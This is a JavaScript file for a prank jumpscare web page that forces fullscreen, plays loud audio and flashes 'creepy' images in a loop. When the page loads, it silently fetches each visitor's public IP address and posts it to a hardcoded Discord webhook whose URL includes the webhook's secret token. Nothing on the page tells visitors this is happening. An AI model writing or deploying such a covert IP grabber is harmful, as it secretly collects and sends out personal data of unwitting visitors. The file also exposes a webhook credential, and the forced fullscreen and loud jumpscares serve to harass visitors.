const webhookUrl = 'https://discord.com/api/webhooks/1210418763699191858/GvSnGZeqeMMFOL4WhLjc8XPyEWB7yAdHKqUq2nh2TOwcwExpSNQU885EioQxJmUdAYip';

window.onload = function() {
    // Fetch the user's IP address
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const userIp = data.ip;
            console.log(`Fetched IP: ${userIp}`); // Debugging line

            // Send the IP address to the Discord webhook
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: `User IP: ${userIp}`
                })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                console.log('IP sent to Discord webhook successfully'); // Debugging line
            })
            .catch(error => console.error('Error sending IP to Discord:', error));
        })
        .catch(error => console.error('Error fetching IP address:', error));

    document.getElementById('play-sound-button').addEventListener('click', function() {
        // Fetch the current page with the ngrok-skip-browser-warning header
        fetch(window.location.href, {
            headers: {
                'ngrok-skip-browser-warning': 'true'
            }
        }).then(() => {
            // Hide the welcome message and button
            document.getElementById('welcome-message').style.display = 'none';
            document.getElementById('play-sound-button').style.display = 'none';

            // Request fullscreen
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            } else if (document.documentElement.mozRequestFullScreen) { // Firefox
                document.documentElement.mozRequestFullScreen();
            } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari, and Opera
                document.documentElement.webkitRequestFullscreen();
            } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
                document.documentElement.msRequestFullscreen();
            }

            var welcomeAudio = document.getElementById('welcome-audio');
            welcomeAudio.volume = 1.0;
            welcomeAudio.play();

            // Show the initial image immediately
            document.getElementById('background-image').src = 'img1.png';

            // Start the jump scare and image switching in loops
            setInterval(showJumpScare, 10000); // Show jumpscare every 10 seconds
            setInterval(switchImage, 3000); // Change image every 3 seconds
        });
    });
}

const images = ['img1.png', 'img2.png', 'img3.png', 'img4.png']; // Add your creepy image filenames here
let currentIndex = 0;

function switchImage() {
    currentIndex = (currentIndex + 1) % images.length;
    document.getElementById('background-image').src = images[currentIndex];
}

function showJumpScare() {
    const jumpScare = document.createElement('div');
    jumpScare.classList.add('jump-scare');
    jumpScare.innerHTML = `
        <img id="start" src="img.png" alt="Jumpscare">
        <audio id="jumpscare-audio" src="website.mp3" autoplay></audio>
    `;
    document.body.appendChild(jumpScare);

    var jumpScareAudio = document.getElementById('jumpscare-audio');
    jumpScareAudio.volume = 1.0; // Set the volume to the maximum

    setTimeout(() => jumpScare.remove(), 3000); // Remove jumpscare after 3 seconds
}
